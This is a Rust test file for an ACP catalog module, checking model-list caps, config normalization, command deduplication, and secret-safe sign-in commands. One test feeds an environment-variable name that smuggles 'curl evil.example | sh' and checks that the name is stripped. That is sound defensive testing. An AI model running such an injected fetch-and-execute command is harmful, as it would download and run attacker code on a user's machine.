#![allow(clippy::unwrap_used)]
use serde_json::json;
use t3_provider::acp_catalog::*;
#[test]
fn acp_catalog_keeps_current_model_beyond_the_cap_and_separates_model_and_interaction_controls() {
    let choices = (0..258)
        .map(|index| json!({"value":format!("model{index}"),"name":format!("Model {index}")}))
        .collect::<Vec<_>>();
    let setup = json!({"configOptions":[
        {"id":"model","category":"model","type":"select","currentValue":"model257","options":choices},
        {"id":"interaction","category":"collaboration_mode","type":"select","currentValue":"plan","options":[{"value":"plan","name":"Plan"}]},
        {"id":"thought","category":"thought_level","name":"Effort","type":"select","currentValue":"","options":[{"group":"Group","options":[{"value":"","name":"None"},{"value":"high","name":"High"}]}]},
        {"id":"fast","category":"model_config","name":"Fast","type":"boolean","currentValue":true}
    ],"modes":{"currentModeId":"high","availableModes":[{"id":"","name":"None"},{"id":"high","name":"High"}]}});
    let live = live_configuration(&setup);
    assert_eq!(live.models.len(), 256);
    assert_eq!(live.models[255].id.0, "model257");
    assert_eq!(live.current_model_id.as_deref(), Some("model257"));
    let encoded = serde_json::to_value(&live.config_options).unwrap();
    assert_eq!(encoded.as_array().unwrap().len(), 2);
    assert_eq!(encoded[0]["currentValue"], EMPTY_CHOICE);
    assert_eq!(encoded[0]["role"], "reasoning");
    assert_eq!(encoded[1]["type"], "boolean");
    assert_eq!(live.model_option_ids.unwrap(), ["thought", "fast"]);
    let modes = json!({"currentModeId":"build","availableModes":[{"id":"build","name":"Build"},{"id":"plan","name":"Plan"}]});
    let descriptors = serde_json::to_value(descriptors(&[], Some(&modes))).unwrap();
    assert_eq!(descriptors[0]["id"], SESSION_MODE);
    let normalized = live_configuration(
        &json!({"modes":{"currentModeId":" plan ","availableModes":[{"id":" build ","name":" Build "},{"id":" plan ","name":" Plan ","description":" Read only "},{"id":" ","name":"Invalid"},{"id":"bad","name":" "}]}}),
    );
    let normalized = serde_json::to_value(normalized.config_options).unwrap();
    assert_eq!(normalized[0]["currentValue"], "plan");
    assert_eq!(normalized[0]["options"].as_array().unwrap().len(), 2);
    assert_eq!(normalized[0]["options"][1]["description"], "Read only");
    assert!(live_configuration(&json!({"modes":{"currentModeId":" ","availableModes":[{"id":"build","name":"Build"},{"id":"plan","name":"Plan"}]}})).config_options.is_empty());
}
#[test]
fn acp_command_and_auth_metadata_are_bounded_deduplicated_and_secret_safe() {
    let commands = commands(&[
        json!({"name":"review","description":" Review ","input":{"hint":" file "}}),
        json!({"name":"REVIEW","description":"duplicate"}),
        json!({"name":"$skill/name","description":" Skill "}),
        json!({"name":" leading"}),
        json!({"name":"$"}),
    ]);
    assert_eq!(commands.slash_commands.len(), 1);
    assert_eq!(commands.skills.len(), 1);
    assert_eq!(commands.skills[0].path.0, "acp://skill/skill%2Fname");
    let methods = auth_methods(
        &[
            json!({"id":"terminal","name":"Sign in","type":"terminal","args":["--login","quoted ' token"],"env":{"API_KEY":"never-format secret"}}),
            json!({"id":"env","name":"Key","type":"env_var","vars":[{"name":"KEY"},{"name":" BAD"}],"link":"https://auth.invalid"}),
            json!({"id":" invalid","name":"Skip"}),
        ],
        Some(("path with spaces", &["acp".into()])),
    );
    assert_eq!(methods.expose().len(), 2);
    assert!(!format!("{methods:?}").contains("never-format"));
    let terminal = methods.expose()[0].command.as_deref().unwrap();
    assert!(terminal.starts_with("API_KEY='never-format secret' 'path with spaces' acp --login"));
    assert!(terminal.contains("'quoted '\\'' token'"));
    assert_eq!(methods.expose()[1].env_var_names.as_ref().unwrap().len(), 1);
    assert!(web_url("file:///private").is_none());
}

/// Review L7: an agent can publish at most 256 commands and skills.
#[test]
fn published_commands_are_capped() {
    let advertised: Vec<_> = (0..300)
        .map(|index| json!({"name": format!("command-{index}")}))
        .chain((0..300).map(|index| json!({"name": format!("$skill-{index}")})))
        .collect();
    let published = commands(&advertised);
    assert_eq!(published.slash_commands.len() + published.skills.len(), 256);
}

/// Review L8: a terminal sign-in's variable names reach the displayed command only when they
/// are plain names, so pasting it cannot run what an agent put in a name.
#[test]
fn terminal_sign_in_variable_names_are_plain_names() {
    let methods = auth_methods(
        &[
            json!({"id":"terminal","name":"Sign in","type":"terminal","env":{"X=1; curl evil.example | sh; Y":"v","GOOD_NAME":"v"}}),
        ],
        Some(("agent", &[])),
    );
    let command = methods.expose()[0].command.as_deref().unwrap();
    assert!(command.contains("GOOD_NAME=v"), "{command}");
    assert!(!command.contains("curl"), "{command}");
}
